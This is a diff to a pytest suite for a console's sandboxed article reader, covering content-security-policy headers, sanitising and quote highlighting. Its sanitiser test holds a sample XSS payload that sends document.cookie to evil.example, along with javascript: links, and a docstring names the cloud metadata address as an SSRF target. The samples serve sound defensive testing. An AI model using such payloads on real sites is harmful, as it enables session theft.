@@ -436,10 +436,15 @@ def test_the_page_references_no_external_host(server):
 
 
 def test_the_csp_stays_shut_except_for_framing(server):
-    """The sources page frames a cited article, so `frame-src https:` was added.
+    """The sources modal frames a cited article, so `frame-src` was added.
 
     Pinned here because a relaxation nobody is watching creeps: everything except
     framing must still be same-origin, and `default-src 'self'` must survive.
+
+    **`'self'` is asserted, not assumed.** Naming `frame-src` at all replaces the
+    fallback chain to `default-src`, so `frame-src https:` on its own forbade the
+    console's own reader frame — the browser blocked it and the modal came up
+    empty, with the only evidence in a console message nobody reads.
     """
     address, _ = server
     conn = HTTPConnection(*address, timeout=30)
@@ -448,7 +453,7 @@ def test_the_csp_stays_shut_except_for_framing(server):
     conn.close()
 
     assert "default-src 'self'" in csp
-    assert "frame-src https:" in csp
+    assert "frame-src 'self' https:" in csp
     for directive in ("script-src 'self'", "connect-src 'self'", "img-src 'self'"):
         assert directive in csp, f"{directive} was loosened along with frame-src"
     assert "frame-src *" not in csp and "frame-src http:" not in csp
@@ -1940,120 +1945,204 @@ def test_the_consoles_own_error_is_never_reported_as_the_console_being_down(serv
 # The sources modal used to frame the live page. Measured across the fifteen
 # most-cited publishers, ten refuse — `X-Frame-Options` or `frame-ancestors` —
 # carrying 388 of their 689 citations, `datacenterdynamics.com` (the most-cited
-# publisher in the database) among them. So the modal reads our own copy, and
-# these guard the endpoint that serves it.
+# publisher in the database) among them. So the modal renders a reader view of
+# our own instead, and these guard the endpoint that serves it.
+
+# Long enough that readability's scoring can tell the article from the furniture.
+# On a three-sentence page it keeps everything, which says nothing about the
+# algorithm — measured on a live `datacenterdynamics.com` page it drops the
+# navigation and all fourteen promo images.
+_FILLER = (
+    "<p>Construction is expected to run through the following two years, with the "
+    "first halls energised ahead of the remainder of the campus, according to "
+    "filings reviewed by this publication and people familiar with the schedule.</p>"
+) * 6
+
+ARTICLE_HTML = f"""<html><head><title>Fairwater | Microsoft News</title></head><body>
+<nav><a href="/x">Home</a><a href="/y">Search</a></nav>
+<article>
+  <h2>Ground broken at Mount Pleasant</h2>
+  <p>Microsoft broke ground at Mount Pleasant this week, the company confirmed on Tuesday
+     after months of speculation about the site and its eventual size.</p>
+  <p>The <em>campus</em> will draw 900 MW at full build, the company said, making it one of
+     the largest single sites announced in the state this year.</p>
+  {_FILLER}
+  <p><a href="/more">Read more</a> about the project and its grid connection timeline.</p>
+  <img src="/img/site.jpg" alt="The site">
+</article>
+<footer>Copyright and terms of use</footer></body></html>"""
+
+FAIRWATER = "https://news.microsoft.com/fairwater/"
 
 
 @pytest.fixture
-def cached_article(tmp_path, seeded_db):
-    """The article cache, holding the one page the seeded project cites."""
-    from tracker.ingest.fetch import cache_path
-
-    root = tmp_path / "articles"
-    root.mkdir()
-    body = (
-        "Microsoft broke ground at Mount Pleasant this week.\n\n"
-        "The campus will draw 900 MW at full build, the company said.\n"
-    )
-    cache_path("https://news.microsoft.com/fairwater/", root).write_text(body, encoding="utf-8")
-    return root
+def reader_dirs(tmp_path):
+    """`(article cache, reader cache)`, both empty."""
+    return tmp_path / "articles", tmp_path / "reader"
 
 
-def _load(db_path, url, root, **kw):
+def _load(db_path, url, dirs, **kw):
     from tracker.db import open_db
     from tracker.webui import article
 
     engine = open_db(db_path, readonly=True)
     with session_scope(engine, commit=False) as session:
-        return article.load(session, url, cache_dir=root, **kw)
+        return article.load(session, url, cache_dir=dirs[0], reader_dir=dirs[1], **kw)
 
 
-def test_the_reader_refuses_a_url_the_database_does_not_cite(seeded_db, cached_article):
-    """The allowlist is the database itself, and that is the whole access rule.
+def _long_quote(db_path, quote):
+    """Give the seeded source a sentence-length quote.
 
-    Without it the console is a request forwarder aimed at whatever network it
-    runs on — `?url=http://169.254.169.254/…` fetched and rendered back. Nothing
-    about "it is only a reader" limits where a reader may be pointed.
-    """
-    found = _load(seeded_db, "https://evil.example/internal", cached_article)
-    assert found.text == ""
-    assert "not cited" in found.error
-
-
-def test_the_reader_serves_the_cache_without_touching_the_network(seeded_db, cached_article):
-    found = _load(seeded_db, "https://news.microsoft.com/fairwater/", cached_article, fetch=False)
-    assert found.via == "cache"
-    assert "Mount Pleasant" in found.text
-
-
-def test_a_stored_quote_is_located_in_the_article(seeded_db, cached_article):
-    """And the span is the *article's* words, not the quote's.
-
-    Measured on the live database: 1,142 of 1,269 stored quotes land exactly, 113
-    are shorter than a mark is worth drawing, and 14 have drifted since they were
-    cited.
+    The fixture's own is 16 characters, under the floor a mark is worth drawing
+    at. A real evidence quote is a sentence.
     """
     from tracker.db import make_engine
     from tracker.models import Source
 
-    # The fixture's own quote is 16 characters — under the floor a mark is worth
-    # drawing at. A real evidence quote is a sentence.
-    with session_scope(make_engine(seeded_db)) as session:
-        session.query(Source).one().quotes = json.dumps(
-            {"mw_planned": "campus will draw 900 MW at full build"}
-        )
-
-    found = _load(seeded_db, "https://news.microsoft.com/fairwater/", cached_article, fetch=False)
-    assert [f for _, _, f in found.spans] == ["mw_planned"]
-    start, end, _ = found.spans[0]
-    # Exactly the stored quote's extent, in the article's own casing — not a
-    # widened sentence. The gate already widened when it decided to store this;
-    # widening again at display time would mark words no citation rested on.
-    assert found.text[start:end] == "campus will draw 900 MW at full build"
+    with session_scope(make_engine(db_path)) as session:
+        session.query(Source).one().quotes = json.dumps({"mw_planned": quote})
 
 
-def test_a_quote_absent_from_the_page_is_not_highlighted_anyway(
-    seeded_db, tmp_path, cached_article
+def test_the_reader_refuses_a_url_the_database_does_not_cite(seeded_db, reader_dirs):
+    """The allowlist is the database itself, and that is the whole access rule.
+
+    Without it the console is a request forwarder aimed at whatever network it
+    runs on — `?url=http://169.254.169.254/...` fetched and rendered back.
+    Nothing about "it only reads" limits where a reader may be pointed.
+    """
+    found = _load(seeded_db, "https://evil.example/internal", reader_dirs)
+    assert found.body == ""
+    assert "not cited" in found.error
+
+
+def test_the_reader_keeps_the_article_and_drops_the_furniture(
+    seeded_db, reader_dirs, monkeypatch
+):
+    from tracker.webui import article
+
+    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
+    found = _load(seeded_db, FAIRWATER, reader_dirs)
+    assert found.via == "reader"
+    assert "Mount Pleasant" in found.body and "<h2>" in found.body
+    # The navigation and the footer are not the article.
+    assert "Search" not in found.body and "Copyright" not in found.body
+
+
+def test_the_reader_strips_script_and_every_attribute_it_does_not_name(
+    seeded_db, reader_dirs, monkeypatch
+):
+    """An allowlist, not a blocklist — so a construct nobody anticipated goes too.
+
+    This is the first of three independent guards. The frame that holds the
+    result is sandboxed with no `allow-` tokens, and the response carries
+    `default-src 'none'`; any one of the three would do, and rendering somebody
+    else's markup deserves all three.
+    """
+    from tracker.webui import article
+
+    hostile = """<html><body><article>
+      <p onclick="steal()" style="position:fixed" data-track="1">Mount Pleasant groundbreaking
+         confirmed by the company this week, with construction already under way.</p>
+      <script>fetch('//evil.example?c='+document.cookie)</script>
+      <iframe src="//evil.example"></iframe>
+      <form action="//evil.example"><input name="p"></form>
+      <a href="javascript:alert(1)">click</a>
+      <img src="javascript:alert(2)">
+    </article></body></html>"""
+    monkeypatch.setattr(article, "_get", lambda url: (hostile, ""))
+    body = _load(seeded_db, FAIRWATER, reader_dirs).body
+    for banned in ("<script", "<iframe", "<form", "<input", "onclick", "javascript:", "data-track"):
+        assert banned not in body, banned
+    assert "Mount Pleasant" in body
+
+
+def test_a_stored_quote_is_marked_where_the_article_really_says_it(
+    seeded_db, reader_dirs, monkeypatch
+):
+    """Marking survives an inline tag splitting the sentence.
+
+    "The <em>campus</em> will draw 900 MW" is one sentence to a reader and three
+    nodes to a parser, which is the case a naive text search silently misses.
+    """
+    from tracker.webui import article
+
+    _long_quote(seeded_db, "will draw 900 MW at full build, the company said")
+    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
+    found = _load(seeded_db, FAIRWATER, reader_dirs)
+    assert found.marks == 1
+    assert 'data-field="mw_planned"' in found.body
+    assert "will draw 900 MW at full build, the company said" in found.body
+
+
+def test_a_quote_absent_from_the_page_is_not_marked_anyway(
+    seeded_db, reader_dirs, monkeypatch
 ):
     """No fuzzy fallback here, deliberately.
 
-    The gate recovers a near-miss when it is *deciding* whether to store a value,
-    because the model resolves pronouns while quoting. Drawing a highlight is a
-    different claim: it says "this sentence is the evidence". If the page has
-    changed since it was cited, the honest outcome is no mark at all rather than
-    a mark over the nearest similar sentence.
+    The gate recovers a near-miss when it is deciding whether to *store* a value,
+    because the model resolves pronouns while quoting. Drawing a highlight makes
+    a different claim — "this sentence is the evidence" — so if the page has
+    changed since it was cited, no mark is the honest outcome rather than a mark
+    over the nearest similar sentence.
     """
-    from tracker.ingest.fetch import cache_path
-
-    url = "https://news.microsoft.com/fairwater/"
-    cache_path(url, cached_article).write_text(
-        "Microsoft broke ground at Mount Pleasant. The site was rezoned in March.",
-        encoding="utf-8",
-    )
-    found = _load(seeded_db, url, cached_article, fetch=False)
-    assert found.via == "cache"
-    assert found.spans == ()
-
-
-def test_the_reader_falls_back_to_the_excerpt_rather_than_an_empty_pane(seeded_db, tmp_path):
-    empty = tmp_path / "none"
-    empty.mkdir()
-    found = _load(seeded_db, "https://news.microsoft.com/fairwater/", empty, fetch=False)
-    assert found.via == "excerpt"
-    assert "900 MW" in found.text
-
-
-def test_two_fields_resting_on_one_sentence_are_marked_once(seeded_db, cached_article):
-    """Nested marks render as a darker band that reads like a third kind of
-    highlight, so the first span wins."""
     from tracker.webui import article
 
-    text = "Alpha beta gamma delta epsilon zeta eta theta iota kappa lambda."
-    spans = article._locate(
-        text,
-        {"mw_planned": "beta gamma delta epsilon zeta eta", "phase": "gamma delta epsilon zeta"},
-    )
-    assert len(spans) == 1
+    _long_quote(seeded_db, "will draw 1,400 MW at full build, the company said")
+    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
+    found = _load(seeded_db, FAIRWATER, reader_dirs)
+    assert found.marks == 0 and "<mark" not in found.body
+
+
+def test_only_whitespace_and_case_are_forgiven_when_marking(
+    seeded_db, reader_dirs, monkeypatch
+):
+    """One rendering of a sentence differs from another by wrapping and case,
+    never by words."""
+    from tracker.webui import article
+
+    _long_quote(seeded_db, "WILL   DRAW\n 900 MW at full build, the company said")
+    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
+    assert _load(seeded_db, FAIRWATER, reader_dirs).marks == 1
+
+
+def test_the_second_open_costs_no_request(seeded_db, reader_dirs, monkeypatch):
+    from tracker.webui import article
+
+    calls = []
+
+    def once(url):
+        calls.append(url)
+        return ARTICLE_HTML, ""
+
+    monkeypatch.setattr(article, "_get", once)
+    _load(seeded_db, FAIRWATER, reader_dirs)
+    second = _load(seeded_db, FAIRWATER, reader_dirs)
+    assert len(calls) == 1
+    assert second.via == "reader-cache" and "Mount Pleasant" in second.body
+
+
+def test_the_reader_falls_back_to_stored_text_rather_than_an_empty_pane(
+    seeded_db, reader_dirs, monkeypatch
+):
+    """The library may be absent, the fetch may fail, the page may hold no
+    article. The excerpt is a few hundred characters, but it is never nothing."""
+    from tracker.webui import article
+
+    monkeypatch.setattr(article, "_get", lambda url: ("", "the publisher answered 403"))
+    found = _load(seeded_db, FAIRWATER, reader_dirs)
+    assert found.via == "excerpt" and "900 MW" in found.body
+
+
+def test_the_rendered_document_locks_itself_down(seeded_db, reader_dirs, monkeypatch):
+    from tracker.webui import article
+
+    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
+    found = _load(seeded_db, FAIRWATER, reader_dirs)
+    page = article.render(found)
+    assert "default-src 'none'" in page
+    assert 'name="referrer" content="no-referrer"' in page
+    assert '<html lang="en" data-theme="light">' in page
+    assert '<html lang="en" data-theme="dark">' in article.render(found, dark=True)
 
 
 def test_the_article_route_validates_before_it_reaches_the_database(server):
@@ -2064,3 +2153,215 @@ def test_the_article_route_validates_before_it_reaches_the_database(server):
     assert status == 400 and "http or https" in body["error"]
     status, body = request(address, "/api/article?url=https%3A%2F%2Fevil.example%2Fx")
     assert status == 404 and "not cited" in body["error"]
+
+
+def test_the_reader_response_replaces_the_consoles_policy_rather_than_adding_to_it(
+    server, monkeypatch
+):
+    """Two CSP headers are intersected by the browser, not merged.
+
+    The reader needs `img-src https:` and the console's policy says
+    `img-src 'self'`; sending both would permit no images at all — a stricter
+    result than either policy asks for, arrived at silently.
+    """
+    from tracker.webui import article
+
+    monkeypatch.setattr(article, "_get", lambda url: (ARTICLE_HTML, ""))
+    headers = headers_for(
+        server[0], "/api/article?url=https%3A%2F%2Fnews.microsoft.com%2Ffairwater%2F"
+    )
+    policy = headers["content-security-policy"]
+    assert policy.count("default-src") == 1
+    assert "default-src 'none'" in policy and "img-src https: data:" in policy
+    assert headers["content-type"].startswith("text/html")
+
+
+def test_the_console_keeps_its_own_policy_everywhere_else(server):
+    policy = headers_for(server[0], "/api/health")["content-security-policy"]
+    assert "default-src 'self'" in policy and "default-src 'none'" not in policy
+
+
+def test_the_reader_frame_is_sandboxed_with_no_allow_tokens():
+    """It loads same-origin, so without this the document could script the
+    console. `sandbox=""` gives it an opaque origin and no script at all."""
+    source = (assets.STATIC_ROOT / "app.js").read_text(encoding="utf-8")
+    assert 'src=${readerSrc} sandbox=""' in source
+
+
+# --- Throwing away the furniture ---------------------------------------------
+#
+# Readability finds the article by text density and is indifferent to what shares
+# a container with it. Two passes bracket it: named chrome removed before it can
+# be scored, and the seams trimmed after.
+#
+# The kill criterion for the whole pass, fixed before it was written: **it must
+# not cost a single marked quote.** Measured over fifteen publishers it cuts 101
+# lines and keeps all 25.
+
+CHROME_HTML = """<html><head><title>T</title></head>
+<body class="wp-singular single single-news postid-2673 no-sidebar">
+<nav class="navbar"><a href="/a">Home</a></nav>
+<div class="ad-slot">Buy this thing</div>
+<div class="share-bar">Share on LinkedIn</div>
+<article class="post-content">
+  <h2>Ground broken at Mount Pleasant</h2>
+  {body}
+</article>
+<div class="related-posts"><h3>Related</h3><a href="/z">Another story</a></div>
+<div id="disqus_thread">Comments go here</div>
+<footer class="site-footer">Copyright and terms of use</footer>
+</body></html>"""
+
+PROSE = (
+    "<p>Microsoft broke ground at Mount Pleasant this week, the company confirmed on "
+    "Tuesday after months of speculation about the site and its eventual size.</p>"
+    "<p>The <em>campus</em> will draw 900 MW at full build, the company said, making it "
+    "one of the largest single sites announced in the state this year.</p>"
+) + (
+    "<p>Construction is expected to run through the following two years, with the first "
+    "halls energised ahead of the remainder of the campus, according to filings reviewed "
+    "by this publication and people familiar with the schedule.</p>"
+) * 6
+
+
+def _read_html(seeded_db, reader_dirs, monkeypatch, page):
+    from tracker.webui import article
+
+    monkeypatch.setattr(article, "_get", lambda url: (page, ""))
+    return _load(seeded_db, FAIRWATER, reader_dirs)
+
+
+def test_named_chrome_never_reaches_the_reader(seeded_db, reader_dirs, monkeypatch):
+    """Ads, share rails, nav, related lists, comments and the footer, by name."""
+    body = _read_html(
+        seeded_db, reader_dirs, monkeypatch, CHROME_HTML.format(body=PROSE)
+    ).body
+    for junk in ("Buy this thing", "Share on LinkedIn", "Another story",
+                 "Comments go here", "Copyright and terms", "Home"):
+        assert junk not in body, junk
+    assert "Mount Pleasant" in body and "900 MW" in body
+
+
+def test_a_class_name_on_the_body_does_not_delete_the_document(
+    seeded_db, reader_dirs, monkeypatch
+):
+    """`no-sidebar` in a WordPress body class matched the `sidebar` rule.
+
+    Dropping it took the article with it, and the pass reported success —
+    `stackinfra.com` came back empty. Structural elements are exempt from name
+    matching, and so is anything holding most of the page's prose.
+    """
+    body = _read_html(
+        seeded_db, reader_dirs, monkeypatch, CHROME_HTML.format(body=PROSE)
+    ).body
+    assert "Mount Pleasant" in body
+
+
+def test_a_container_too_large_to_be_chrome_is_kept_whatever_it_is_called(
+    seeded_db, reader_dirs, monkeypatch
+):
+    """The general form of the same mistake: chrome is never most of a page."""
+    page = CHROME_HTML.format(body=f'<div class="promo">{PROSE}</div>')
+    assert "Mount Pleasant" in _read_html(seeded_db, reader_dirs, monkeypatch, page).body
+
+
+def test_a_stop_heading_ends_the_article(seeded_db, reader_dirs, monkeypatch):
+    """A Q&A or "Related stories" block that survived the class pass is cut at
+    its heading, along with everything after it."""
+    page = CHROME_HTML.format(
+        body=PROSE + "<h3>Frequently Asked Questions</h3>"
+        "<p>How big is it? Very big indeed, and here is a long answer about that.</p>"
+        "<p>Who pays for the substation upgrades that the campus is going to need?</p>"
+    )
+    body = _read_html(seeded_db, reader_dirs, monkeypatch, page).body
+    assert "Mount Pleasant" in body and "900 MW" in body
+    assert "Frequently Asked" not in body and "How big is it" not in body
+
+
+def test_cutting_the_tail_keeps_everything_before_it(
+    seeded_db, reader_dirs, monkeypatch
+):
+    """The ancestors are walked, never removed.
+
+    A first attempt deleted the parent that still held everything kept so far, so
+    three publishers came back completely empty while the pass reported success.
+    """
+    page = CHROME_HTML.format(
+        body=f"<div><div>{PROSE}</div><div><h3>Related Articles</h3>"
+        f"<p>Some other story entirely, of no relevance to this one at all.</p>"
+        f"</div></div>"
+    )
+    body = _read_html(seeded_db, reader_dirs, monkeypatch, page).body
+    assert body.count("<p>") >= 7
+    assert "Related Articles" not in body and "no relevance" not in body
+
+
+def test_a_signpost_goes_even_when_it_wraps_a_link(
+    seeded_db, reader_dirs, monkeypatch
+):
+    """"For more information, visit <a>example.com</a>" is one sentence to a
+    reader and a parent plus a child to a parser. Judging elements with children
+    by their children alone let every press release keep its sign-off."""
+    page = CHROME_HTML.format(
+        body=PROSE + '<p>For more information, visit <a href="https://x.example">x</a></p>'
+        "<p>READ MORE: Northern California Data Centers</p>"
+    )
+    body = _read_html(seeded_db, reader_dirs, monkeypatch, page).body
+    assert "For more information" not in body and "READ MORE" not in body
+    assert "Mount Pleasant" in body
+
+
+def test_a_sentence_merely_mentioning_a_signpost_word_survives(
+    seeded_db, reader_dirs, monkeypatch
+):
+    """The junk rules are anchored. "Sources close to the project said…" is
+    reporting, not a sources list."""
+    keep = ("<p>Sources close to the project said the substation contract had not yet "
+            "been awarded, and that more information was expected within weeks.</p>")
+    body = _read_html(
+        seeded_db, reader_dirs, monkeypatch, CHROME_HTML.format(body=PROSE + keep)
+    ).body
+    assert "Sources close to the project" in body
+
+
+def test_mojibake_the_publisher_baked_in_is_repaired(seeded_db, reader_dirs, monkeypatch):
+    """`datacenterknowledge.com` serves "Cote dâ€™Ivoire" — valid UTF-8
+    encoding three characters that were themselves a mis-decode upstream."""
+    page = CHROME_HTML.format(
+        body=PROSE + "<p>The campus in Cote dâ€™Ivoire opened, and "
+        "â€œit changed everythingâ€, the operator said.</p>"
+    )
+    body = _read_html(seeded_db, reader_dirs, monkeypatch, page).body
+    assert "Cote d’Ivoire" in body
+    assert "“it changed everything”" in body
+
+
+def test_real_accents_are_never_mistaken_for_mojibake():
+    """The repair is kept only when the run round-trips, so text that was never
+    double-encoded comes back untouched."""
+    from tracker.webui import article
+
+    for intact in ("Café naïve résumé Über",
+                   "It’s “fine” — really",
+                   "数据中心", "Nothing wrong here"):
+        assert article._demojibake(intact) == intact
+
+
+def test_valid_utf8_beats_a_wrong_declaration():
+    """Believing the page is the obvious rule and the wrong one.
+
+    A page that declares Latin-1 and serves UTF-8 decodes *without error* as
+    Latin-1 — every byte is a valid character — so a declaration-first order
+    produces mojibake silently, with no exception to fall through.
+    """
+    from tracker.webui import article
+
+    raw = '<meta charset="iso-8859-1"><p>Cote d’Ivoire</p>'.encode()
+    assert "Cote d’Ivoire" in article._decode(raw, "text/html; charset=iso-8859-1")
+
+
+def test_a_page_that_really_is_latin1_still_decodes():
+    from tracker.webui import article
+
+    raw = "<p>Café naïve</p>".encode("latin-1")
+    assert "Café naïve" in article._decode(raw, "text/html; charset=iso-8859-1")
